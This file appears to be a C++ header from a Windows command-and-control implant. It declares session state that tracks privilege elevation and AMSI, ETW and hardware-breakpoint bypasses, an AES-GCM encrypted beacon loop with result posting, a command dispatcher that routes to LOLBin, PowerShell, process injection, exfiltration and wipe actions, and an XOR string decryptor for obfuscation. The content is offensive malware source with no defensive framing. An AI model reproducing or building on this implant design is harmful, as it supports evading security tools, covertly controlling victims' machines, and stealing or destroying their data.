#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include "config.hpp"

// ---------------------------------------------------------------------------
// Session — implant identity and capability state, sent with every beacon
// ---------------------------------------------------------------------------
struct Session {
    std::wstring sessionId;    // FNV hash(hostname) | username
    std::wstring hostname;
    std::wstring username;
    DWORD build;               // OS build number (via RtlGetVersion)
    BOOL  elevated;            // running as admin/SYSTEM
    BOOL  amsiPatched;         // AMSI bypass applied
    BOOL  etwPatched;          // ETW bypass applied
    BOOL  hwbpsCleared;        // hardware breakpoints cleared
};

// ---------------------------------------------------------------------------
// C2 protocol
// ---------------------------------------------------------------------------

// Main beacon loop — blocks until "exit" received or process killed
VOID BeaconLoop();

// POST /beacon — AES-GCM encrypted, returns next task in taskOut
BOOL SendBeacon(const Session& session, std::wstring& taskOut);

// POST /result — AES-GCM encrypted output back to server
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);

// Full command dispatcher — routes to LOLBin/PS/inject/exfil/wipe/etc.
std::wstring ExecuteCommand(const std::wstring& cmd);

// XOR-decrypt an encrypted byte array (legacy, kept for compatibility)
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key);